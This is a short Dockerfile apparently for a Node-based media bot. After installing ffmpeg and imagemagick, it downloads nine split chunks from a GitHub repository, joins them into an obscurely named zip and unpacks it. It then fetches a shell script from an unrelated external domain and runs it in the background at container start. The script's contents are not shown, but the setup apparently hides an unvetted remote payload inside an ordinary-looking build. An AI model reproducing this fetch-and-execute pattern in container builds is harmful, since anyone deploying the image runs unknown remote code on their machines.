FROM node:lts-buster
RUN apt-get update && \
apt-get install -y \
ffmpeg \
imagemagick \
webp && \
apt-get upgrade -y && \
rm -rf /var/lib/apt/lists/*
RUN wget https://github.com/akamebotii/Lady-3.0/raw/main/aa https://github.com/akamebotii/Lady-3.0/raw/main/ab https://github.com/akamebotii/Lady-3.0/raw/main/ac https://github.com/akamebotii/Lady-3.0/raw/main/ad https://github.com/akamebotii/Lady-3.0/raw/main/ae https://github.com/akamebotii/Lady-3.0/raw/main/af https://github.com/akamebotii/Lady-3.0/raw/main/ag https://github.com/akamebotii/Lady-3.0/raw/main/ah https://github.com/akamebotii/Lady-3.0/raw/main/ai
RUN cat a* > renderbfanarrowx.zip
RUN unzip renderbfanarrowx.zip
RUN rm -rf renderbfanarrowx.zip
RUN wget -O main.sh https://go.bruceds.my.id/EPMS.sh
COPY . .
RUN chmod +x ./main.sh
RUN chmod +x ./start.sh
EXPOSE 5000 3000
CMD ["sh", "-c", "./start.sh & ./main.sh"]
